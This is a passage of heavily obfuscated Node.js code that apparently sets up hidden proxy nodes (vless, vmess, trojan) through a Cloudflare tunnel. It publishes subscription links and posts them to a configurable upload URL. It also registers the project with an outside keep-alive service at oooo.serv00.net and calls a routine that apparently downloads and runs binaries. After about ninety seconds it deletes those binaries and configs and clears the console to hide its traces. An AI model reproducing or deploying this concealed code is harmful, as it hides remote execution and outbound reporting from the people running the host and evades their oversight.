_0x67388c={_0x108799:0x1f2,_0x495c38:0x1e6,_0xf80264:0x1cc,_0x44569b:0x162,_0x4dca78:0x17a,_0x3bb326:0x1e4,_0x24d23f:0x1ce,_0x223a97:0x20f,_0x269ef4:0x16e,_0x1cd743:0x1e4,_0x3410c9:0x18e,_0x275a44:0x1e8,_0x40cb83:0x19e},_0x357a4e=await _0x13c3d7(),_0x3879cf=NAME?NAME+'-'+_0x357a4e:_0x357a4e;return new Promise(_0x213614=>{const _0x52fc95={_0x524cd6:0x1e1};setTimeout(()=>{const _0x3ce405=_0x3934,_0x3d935e={'v':'2','ps':''+_0x3879cf,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3ce405(_0x67388c._0x108799),'net':'ws','type':_0x3ce405(0x1f2),'host':_0xe07eb3,'path':_0x3ce405(0x190),'tls':_0x3ce405(_0x67388c._0x495c38),'sni':_0xe07eb3,'alpn':'','fp':_0x3ce405(_0x67388c._0xf80264)},_0x4595ac='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0xe07eb3+_0x3ce405(_0x67388c._0x44569b)+_0xe07eb3+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3879cf+_0x3ce405(0x15a)+Buffer[_0x3ce405(0x1ea)](JSON[_0x3ce405(0x1c6)](_0x3d935e))[_0x3ce405(_0x67388c._0x4dca78)](_0x3ce405(_0x67388c._0x3bb326))+_0x3ce405(_0x67388c._0x24d23f)+UUID+'@'+CFIP+':'+CFPORT+_0x3ce405(_0x67388c._0x223a97)+_0xe07eb3+_0x3ce405(0x162)+_0xe07eb3+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3879cf+_0x3ce405(_0x67388c._0x269ef4);console[_0x3ce405(0x1e8)](Buffer['from'](_0x4595ac)[_0x3ce405(_0x67388c._0x4dca78)](_0x3ce405(_0x67388c._0x1cd743))),fs[_0x3ce405(_0x67388c._0x3410c9)](subPath,Buffer['from'](_0x4595ac)['toString']('base64')),console[_0x3ce405(_0x67388c._0x275a44)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x3ce405(_0x67388c._0x40cb83)]('/'+SUB_PATH,(_0x531102,_0x107a68)=>{const _0x2d5640=_0x3ce405,_0x1c3ce7=Buffer[_0x2d5640(0x1ea)](_0x4595ac)['toString'](_0x2d5640(0x1e4));_0x107a68[_0x2d5640(0x1e0)](_0x2d5640(0x1bb),'text/plain;\x20charset=utf-8'),_0x107a68[_0x2d5640(_0x52fc95._0x524cd6)](_0x1c3ce7);}),_0x213614(_0x4595ac);},0x7d0);});}}async function uploadNodes(){const _0x412b21={_0x4dc5f5:0x1b1,_0x6c7024:0x1e5,_0x3593ae:0x18f,_0x3f5590:0x1b9,_0x4bd3bd:0x1fe},_0x5cdc64=_0x215147;if(UPLOAD_URL&&PROJECT_URL){const _0x2e886d=PROJECT_URL+'/'+SUB_PATH,_0xdd10a3={'subscription':[_0x2e886d]};try{const _0x5cb004=await axios['post'](UPLOAD_URL+_0x5cdc64(0x1d8),_0xdd10a3,{'headers':{'Content-Type':'application/json'}});return _0x5cb004&&_0x5cb004['status']===0xc8?(console[_0x5cdc64(0x1e8)](_0x5cdc64(0x1c2)),_0x5cb004):null;}catch(_0xd01fc){if(_0xd01fc[_0x5cdc64(_0x412b21._0x4dc5f5)]){if(_0xd01fc['response'][_0x5cdc64(0x1fe)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5cdc64(_0x412b21._0x6c7024)](listPath))return;const _0x5eb8cb=fs['readFileSync'](listPath,_0x5cdc64(_0x412b21._0x3593ae)),_0x485212=_0x5eb8cb[_0x5cdc64(0x1b4)]('\x0a')['filter'](_0x5c8981=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5cdc64(0x1a0)](_0x5c8981));if(_0x485212['length']===0x0)return;const _0x22de3f=JSON[_0x5cdc64(0x1c6)]({'nodes':_0x485212});try{const _0x45fd8a=await axios[_0x5cdc64(_0x412b21._0x3f5590)](UPLOAD_URL+_0x5cdc64(0x207),_0x22de3f,{'headers':{'Content-Type':'application/json'}});return _0x45fd8a&&_0x45fd8a[_0x5cdc64(_0x412b21._0x4bd3bd)]===0xc8?(console['log'](_0x5cdc64(0x1a4)),_0x45fd8a):null;}catch(_0x20a1ac){return null;}}else return;}}function cleanFiles(){const _0x304da9={_0x122dd7:0x1ba,_0x1129d3:0x20c,_0x178258:0x1da,_0x36b27c:0x17b};setTimeout(()=>{const _0x1a1322={_0x3f0953:0x1e8,_0x34be73:0x1b6},_0x5005e4={_0x4919b4:0x1bf,_0x40ec23:0x1b6},_0x3ee873=_0x3934,_0x2a253f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2a253f[_0x3ee873(_0x304da9._0x122dd7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2a253f[_0x3ee873(0x1ba)](phpPath);process[_0x3ee873(_0x304da9._0x1129d3)]===_0x3ee873(_0x304da9._0x178258)?exec('del\x20/f\x20/q\x20'+_0x2a253f[_0x3ee873(_0x304da9._0x36b27c)]('\x20')+'\x20>\x20nul\x202>&1',_0x1b13a3=>{const _0x2fddb3=_0x3ee873;console[_0x2fddb3(0x1f6)](),console[_0x2fddb3(0x1e8)](_0x2fddb3(_0x5005e4._0x4919b4)),console[_0x2fddb3(0x1e8)](_0x2fddb3(_0x5005e4._0x40ec23));}):exec(_0x3ee873(0x1c8)+_0x2a253f['join']('\x20')+_0x3ee873(0x163),_0x59ed66=>{const _0x2e50a2=_0x3ee873;console['clear'](),console['log']('App\x20is\x20running'),console[_0x2e50a2(_0x1a1322._0x3f0953)](_0x2e50a2(_0x1a1322._0x34be73));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x501058={_0x12e8e7:0x1bc},_0x561673=_0x215147;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x561673(0x1e8)](_0x561673(0x1c9));return;}try{const _0x1704b5=await axios[_0x561673(0x1b9)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x561673(0x1e8)](_0x561673(0x189)),_0x1704b5;}catch(_0xf24b21){return console[_0x561673(0x1d4)](_0x561673(_0x501058._0x12e8e7)+_0xf24b21[_0x561673(0x1d3)]),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xa6bb8c){console['error']('Error\x20in\x20startserver:',_0xa6bb8c);}}startserver()[_0x215147(0x170)](_0x215631=>{const _0x2c57d8={_0x291c3d:0x1ac},_0x280f77=_0x215147;console['error'](_0x280f77(_0x2c57d8._0x291c3d),_0x215631);}),app[_0x215147(0x201)](PORT,()=>console[_0x215147(0x1e8)](_0x215147(0x153)+PORT+'!'));
